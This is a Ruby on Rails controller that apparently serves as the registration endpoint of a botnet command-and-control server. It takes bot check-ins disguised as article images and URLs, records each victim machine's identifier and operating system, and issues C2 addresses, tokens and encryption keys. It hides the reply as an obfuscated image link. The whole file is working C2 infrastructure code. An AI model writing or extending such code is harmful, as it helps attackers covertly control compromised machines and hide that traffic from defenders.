# frozen_string_literal: true

module Api::V1::Bots
  class RegisterController < Api::V1::Bots::BaseController
    include ::BotHelper
    include ::CryptHelper

    skip_before_action :authenticate_bot_request, only: :create

    def create
      raise 'Lack of marker in registration' if get_marker_from_request.blank?

      settings = FacadeNew.find_by(marker: get_marker_from_request)
      result = recover_register_payload(
        bot_params[:image],
        bot_params[:url],
        Parameter.reg_pool,
        settings.crypt_config['key'],
        settings.crypt_config['iv']
      )
      result = result.with_indifferent_access

      bot_uuid = SecureRandom.uuid
      b = Bot.find_or_initialize_by(machine_id: result.dig(:system, :unique_identifier))

      raise "Machine already registered with machine_id: #{b.machine_id}" if (b.bot_status.present? && !b.bot_status.valid_to_registered?)

      b.assign_attributes(
        description: result.dig(:system, :os, :arch),
        code: bot_uuid,
        active: false,
        machine_id: result.dig(:system, :unique_identifier),
        os_type: result.dig(:system, :os, :target),
        os_version: result.dig(:system, :extra_os, :PRETTY_NAME),
        bot_status: BotStatus.registration
      )
      b.save

      c_c = generate_bot_config
      crypt_config = generate_key_iv

      b.bot_settings.update_all(active: false)
      b.bot_settings.create(
        config: {
          ruby_version: result.dig(:ruby, :version),
          system: result.dig(:system),
          c_c: c_c
        },
        crypt_config: crypt_config,
        active: true
      )

      b.track_as_normal_operation(description: 'Bot registration', ip: request.remote_ip)

      payload = encrypt(
        {
          C_C_URI: c_c[:uri],
          C_C_POOL: c_c[:pool],
          C_C_TOKEN: c_c[:token],
          C_C_CIPHER_KEY: crypt_config[:key],
          C_C_CIPHER_IV: crypt_config[:iv],
          BOT_ID: bot_uuid
        }.to_s,
        settings.crypt_config['key'],
        settings.crypt_config['iv']
      )

      resp = {
        article: {
          image: payload[:ciphertext],
          url: ofuscate_image_link(payload[:tag], Parameter.reg_uri.split('https://').last, Parameter.reg_pool)
        }
      }

      render json: resp, status: 201

    rescue StandardError => e
      process_error(e)
    end

    private

    def bot_params
      params.permit(
        :name,
        :image,
        :url
      )
    end

    def get_marker_from_request
      request.headers['HTTP_MARKER']
    end
  end
end
